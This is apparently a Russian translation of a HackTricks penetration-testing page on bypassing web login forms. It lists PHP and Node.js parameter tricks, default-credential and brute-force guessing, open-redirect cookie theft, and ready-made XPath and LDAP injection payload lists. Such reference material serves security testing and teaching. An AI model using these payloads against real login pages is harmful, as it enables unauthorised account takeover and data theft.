**Обход аутентификации (Login Bypass)**

**Обход стандартного входа**

Если вы обнаружили страницу входа, вот несколько техник, которые можно попробовать для ее обхода:

*   **Проверьте комментарии внутри страницы** (прокрутите вниз и вправо?).
*   **Проверьте, можете ли вы напрямую получить доступ к защищенным страницам**, минуя страницу входа.
*   **Попробуйте не отправлять параметры** (не отправляйте никакие параметры или отправьте только один).
*   **Проверьте ошибки сравнения в PHP**: отправьте `user[]=a&pwd=b`, `user=a&pwd[]=b`, `user[]=a&pwd[]=b`.
*   **Измените тип содержимого на JSON** и отправьте JSON-значения (включая булево `true`).
    *   Если вы получите ответ, что POST не поддерживается, попробуйте отправить JSON в теле запроса, но с GET-запросом и заголовком `Content-Type: application/json`.
*   **Проверьте потенциальную ошибку парсинга в Node.js** (читайте здесь): `password[password]=1`.
    *   Node.js преобразует эту полезную нагрузку в запрос, подобный следующему: `SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND password=password=1;`, что делает часть с паролем всегда истинной.
    *   Если вы можете отправить JSON-объект, отправьте `{"password":{"password": 1}}` для обхода входа.
    *   Помните, что для обхода этого входа вам все равно нужно знать и отправить действительное имя пользователя.
    *   Добавление опции `"stringifyObjects": true` при вызове `mysql.createConnection` в конечном итоге заблокирует все неожиданные варианты поведения при передаче объекта в параметре.
*   **Проверьте учетные данные:**
    *   Учетные данные по умолчанию для используемой технологии/платформы.
    *   Распространенные комбинации (root, admin, password, название технологии, пользователь по умолчанию с одним из этих паролей).
    *   Создайте словарь с помощью Cewl, добавьте имя пользователя и пароль по умолчанию (если они есть) и попробуйте подобрать их, используя все слова в качестве имен пользователей и паролей.
    *   Подбор с использованием большого словаря (Brute force).

**Обход аутентификации через SQL-инъекции (SQL Injection authentication bypass)**

Здесь вы можете найти несколько приемов для обхода входа с помощью SQL-инъекций.

На следующей странице вы можете найти специальный список для попытки обхода входа через SQL-инъекции:

{{#ref}} sql-login-bypass.md {{#endref}}

**Обход аутентификации через NoSQL-инъекции (NoSQL Injection authentication bypass)**

Здесь вы можете найти несколько приемов для обхода входа с помощью NoSQL-инъекций.

Поскольку NoSQL-инъекции требуют изменения значений параметров, вам нужно будет тестировать их вручную.

**Обход аутентификации через XPath-инъекции (XPath Injection authentication bypass)**

Здесь вы можете найти несколько приемов для обхода входа с помощью XPath-инъекций.

```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```

**Обход аутентификации через LDAP-инъекции (LDAP Injection authentication bypass)**

Здесь вы можете найти несколько приемов для обхода входа с помощью LDAP-инъекций.

```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```

**Запомнить меня (Remember Me)**

Если на странице есть функция "Запомнить меня", проверьте, как она реализована, и посмотрите, можно ли ее использовать для захвата других учетных записей.

**Перенаправления (Redirects)**

Страницы обычно перенаправляют пользователей после входа в систему. Проверьте, можете ли вы изменить это перенаправление, чтобы вызвать открытое перенаправление (Open Redirect). Возможно, вы сможете украсть некоторую информацию (коды, cookie...), если перенаправите пользователя на свой сайт.

**Другие проверки**

*   **Проверьте, можно ли перечислять имена пользователей**, злоупотребляя функциональностью входа.
*   **Проверьте, активен ли автозаполнение** в полях ввода паролей/конфиденциальной информации: `<input autocomplete="false"`

**Автоматические инструменты**

*   **HTLogin**



* [Original](https://github.com/HackTricks-wiki/hacktricks/tree/master/src/pentesting-web/login-bypass)
